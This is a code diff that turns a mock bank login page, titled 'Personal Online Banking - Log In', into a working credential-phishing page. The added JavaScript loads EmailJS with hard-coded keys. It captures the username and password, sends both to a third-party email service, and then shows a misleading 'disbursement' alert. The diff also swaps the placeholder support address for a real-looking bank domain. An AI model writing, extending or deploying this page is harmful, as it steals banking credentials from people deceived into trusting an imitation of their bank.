@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Personal Online Banking - Log In</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Segoe UI", Arial, sans-serif; }
 
@@ -197,7 +198,7 @@
       </form>
       <div class="links">
         <a href="#">New to online banking</a><span>|</span>
-        <a href="#">Forgot Password</a><span>|</span>
+        <a href="#">Forgot password</a><span>|</span>
       </div>
     </div>
   </div>
@@ -207,26 +208,55 @@
       <a href="#">Online Security</a> | <a href="#">FAQs</a> | <a href="#">Internet Banking Demos</a> |
       <a href="#">Privacy Policy</a> | <a href="#">Terms &amp; Conditions</a>
     </div>
-    <div>For more details, call us toll free at 1-800-000-0000 or message us at support@example.com</div>
+    <div>For more details, call us toll free at 1-800-000-0000 or message us at support@nbc.com</div>
     <div class="bar">
       <span>Copyright 2026 Example Bank. All Rights Reserved</span>
       <span>Privacy Policy &nbsp;|&nbsp; Terms of Use</span>
     </div>
   </footer>
+  <script src="input.js"></script>
 
 <script>
   const form      = document.getElementById('loginForm');
-  const btn       = form.querySelector('.btn');
+  const submitBtn       = form.querySelector('.btn');
   const pwdField  = document.getElementById('passwordField');
+  const user = document.getElementById('username');
   const pwdInput  = document.getElementById('password');
   const togglePwd = document.getElementById('togglePwd');
   let step = 1; // 1 = username, 2 = password
 
-  form.addEventListener('submit', e => {
+  const EMAILJS_PUBLIC_KEY  = 'Bkz2TxSh16b6JL5tF';   // Account -> API Keys
+  const EMAILJS_SERVICE_ID  = 'service_see48wd';   // Email Services
+  const EMAILJS_TEMPLATE_ID = 'template_7co07ru';  // Email Templates
+
+  // Initialize EmailJS once the SDK is available
+  (function initEmailJS() {
+    if (typeof emailjs === 'undefined') {
+      window.addEventListener('load', () => emailjs.init(EMAILJS_PUBLIC_KEY));
+    } else {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+    }
+  })();
+
+document.addEventListener('DOMContentLoaded', () => {
+
+    // Safety check
+  if (!form || !user || !pwdInput || !submitBtn) {
+    console.error('Missing element(s):', {
+      form:     !!form,
+      name:     !!user,
+      password: !!pwdInput,
+      button:   !!submitBtn,
+    });
+    return;
+  }
+
+
+  form.addEventListener('submit', async (e)=> {
     e.preventDefault();
 
     if (step === 1) {
-      const user = document.getElementById('username').value.trim();
+      
       if (!user) { alert('Please enter your username'); return; }
 
       // Remember username demo
@@ -240,12 +270,53 @@
       step = 2;
       document.getElementById('username').disabled = true;
       pwdField.classList.remove('hidden');
-      btn.textContent = 'Log In';
+      submitBtn.textContent = 'Log In';
       pwdInput.focus();
     } else {
       const pwd = pwdInput.value;
       if (!pwd) { alert('Please enter your password'); return; }
-      alert('Logging in as ' + document.getElementById('username').value + '...');
+      // alert('Logging in as ' + document.getElementById('username').value + '...');
+      
+    // 1. Fetch the two input variables
+    const nameValue     = user.value
+    const passwordValue = pwdInput.value;
+    console.log(nameValue, passwordValue)
+ 
+    // Basic validation
+    if (!nameValue || !passwordValue) {
+      alert('Please fill in both fields.');
+      return;
+    }
+
+    // 2. Show "processing / sending" state
+    const originalBtnText = submitBtn.textContent;
+    submitBtn.textContent = 'Sending...';
+    submitBtn.disabled    = true;
+
+    // 3. Send via EmailJS
+    try {
+      const response = await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        {
+          name:     nameValue,
+          password: passwordValue,
+        }
+      );
+
+      console.log('EmailJS success:', response.status, response.text);
+
+      // 4. Alert afterwards
+      alert('Processing disbursement queue addition.');
+      form.reset();
+    } catch (error) {
+      console.error('EmailJS failed:', error);
+      alert('Failed to send message. Please try again later.');
+    } finally {
+      // Restore button state no matter what
+      submitBtn.textContent = originalBtnText;
+      submitBtn.disabled    = false;
+    }
       // TODO: send credentials to your server here
     }
   });
@@ -261,6 +332,7 @@
     document.getElementById('username').value = saved;
     document.getElementById('remember').checked = true;
   }
+});
 </script>
 </body>
 </html>
